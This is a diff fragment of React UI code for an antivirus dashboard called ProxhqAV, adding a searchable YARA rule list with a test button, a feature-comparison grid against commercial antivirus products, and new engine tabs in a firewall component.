+          extra={<input value={search} onChange={e=>setSearch(e.target.value)} placeholder="Search rules..." style={{ background:"#111", border:"1px solid #222", borderRadius:4, padding:"3px 8px", color:"#aaa", fontSize:9, fontFamily:"monospace", width:130 }}/>}
+        />
+        <div style={{ maxHeight:560, overflow:"auto" }}>
+          {filteredRules.map(rule=>(
+            <div key={rule.id} style={{ background:"#111", borderRadius:6, padding:"9px 12px", marginBottom:6, borderLeft:`3px solid ${SEV_AV[rule.severity]??"#333"}`, cursor:"pointer" }} onClick={()=>setExpanded(expanded===rule.id?null:rule.id)}>
+              <div style={{ display:"flex", alignItems:"center", gap:6, marginBottom:3 }}>
+                <Bdg label={rule.severity.toUpperCase()} color={SEV_AV[rule.severity]??"#888"} sm/>
+                {rule.matchCount>0&&<Bdg label={`${rule.matchCount} matches`} color="#ff9900" sm/>}
+                <span style={{ fontFamily:"monospace", fontSize:10, color:"#fff", fontWeight:700 }}>{rule.name.replace("ProxhqAV_","")}</span>
+              </div>
+              <div style={{ fontSize:9, color:"#777" }}>{rule.description?.substring(0,80)}</div>
+              {rule.malwareFamily&&<div style={{ fontSize:8, color:"#555", marginTop:2 }}>Family: {rule.malwareFamily}</div>}
+              {rule.tags&&<div style={{ marginTop:4, display:"flex", flexWrap:"wrap", gap:2 }}>{rule.tags.split(",").slice(0,5).map(t=><Bdg key={t} label={t} color="#333" sm/>)}</div>}
+              {expanded===rule.id&&(
+                <div style={{ marginTop:8 }}>
+                  <div style={{ background:"#050505", border:"1px solid #1a1a1a", borderRadius:6, padding:"8px 10px", fontFamily:"monospace", fontSize:8, color:"#00ff88", whiteSpace:"pre-wrap", maxHeight:300, overflow:"auto" }}>
+                    {rule.ruleText}
+                  </div>
+                  <div style={{display:"flex",gap:4,marginTop:6}}>
+                    <Btn2 onClick={async()=>{setScanContent(rule.ruleText.match(/\$\w+\s*=\s*"([^"]+)"/)?.[1]??scanContent); setExpanded(null);}} color="#cc44ff" sm>Test This Rule</Btn2>
+                    <CopyBtn text={rule.ruleText}/>
+                  </div>
+                </div>
+              )}
+            </div>
+          ))}
+          {!loading&&filteredRules.length===0&&<div style={{color:"#333",fontFamily:"monospace",fontSize:11,padding:10}}>No rules — click "Seed Threat Intel" in the ProxhqAV Engine tab first</div>}
+        </div>
+      </FwmCard>
+
+      {/* YARA Research Panel */}
+      <FwmCard style={{ gridColumn:"1/-1" }}>
+        <SectionTitle icon={<ShieldCheck size={12} color="#00ff88"/>} title="ProxhqAV vs. Commercial Antivirus — Feature Comparison"/>
+        <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", gap:8 }}>
+          {[
+            {feature:"Hash Signature DB",      proxhq:true,  norton:true,  crowdstrike:true,  sentinel:true},
+            {feature:"YARA Rule Engine",        proxhq:true,  norton:false, crowdstrike:true,  sentinel:true},
+            {feature:"LOLBin Detection",        proxhq:true,  norton:false, crowdstrike:true,  sentinel:true},
+            {feature:"IOC Database (C2/IP)",    proxhq:true,  norton:true,  crowdstrike:true,  sentinel:true},
+            {feature:"Ransomware Ext. DB",      proxhq:true,  norton:true,  crowdstrike:true,  sentinel:true},
+            {feature:"Entropy Analysis",        proxhq:true,  norton:false, crowdstrike:true,  sentinel:true},
+            {feature:"Process Injection Det.",  proxhq:true,  norton:false, crowdstrike:true,  sentinel:true},
+            {feature:"Anti-Evasion Engine",     proxhq:true,  norton:false, crowdstrike:true,  sentinel:false},
+            {feature:"Macro Dropper Detection", proxhq:true,  norton:true,  crowdstrike:true,  sentinel:true},
+            {feature:"VPN-Native Integration",  proxhq:true,  norton:false, crowdstrike:false, sentinel:false},
+            {feature:"File Quarantine Engine",  proxhq:true,  norton:true,  crowdstrike:true,  sentinel:true},
+            {feature:"Memory Scan (YARA)",      proxhq:true,  norton:true,  crowdstrike:true,  sentinel:true},
+            {feature:"Open Source Intel (OSINT)",proxhq:true, norton:false, crowdstrike:false, sentinel:false},
+            {feature:"Rootkit Scanner",         proxhq:true,  norton:true,  crowdstrike:true,  sentinel:true},
+            {feature:"Blockchain IOC (SigMiner)",proxhq:true, norton:false, crowdstrike:false, sentinel:false},
+            {feature:"Zero Trust Integration",  proxhq:true,  norton:false, crowdstrike:true,  sentinel:true},
+          ].map(f=>(
+            <div key={f.feature} style={{ background:"#111", borderRadius:6, padding:"8px 10px" }}>
+              <div style={{ fontSize:9, color:"#aaa", marginBottom:6, fontWeight:700 }}>{f.feature}</div>
+              {[{n:"ProxhqAV",v:f.proxhq,c:"#00ff88"},{n:"Norton",v:f.norton,c:"#ffaa00"},{n:"CrowdStrike",v:f.crowdstrike,c:"#4488ff"},{n:"SentinelOne",v:f.sentinel,c:"#cc44ff"}].map(av=>(
+                <div key={av.n} style={{ display:"flex", justifyContent:"space-between", fontSize:8, marginBottom:2, color:av.v?av.c:"#333" }}>
+                  <span>{av.n}</span><span>{av.v?"✓":"✗"}</span>
+                </div>
+              ))}
+            </div>
+          ))}
+        </div>
+      </FwmCard>
+    </div>
+  );
+}
+
 // ── Main ──────────────────────────────────────────────────────────────────
 export default function Firewall() {
   const [tab, setTab] = useState("overview");
@@ -4830,6 +5324,10 @@ export default function Firewall() {
       {tab==="shredder"    &&<ShredderTab/>}
       {tab==="pup"         &&<PupTab/>}
       {tab==="registry"    &&<RegistryTab/>}
+      {/* ── ProxhqAV Antivirus Engine ── */}
+      {tab==="avengine"    &&<ProxhqAvTab/>}
+      {tab==="iocdb"       &&<IocDbTab/>}
+      {tab==="yaraengine"  &&<YaraEngineTab/>}
     </div>
   );
 }
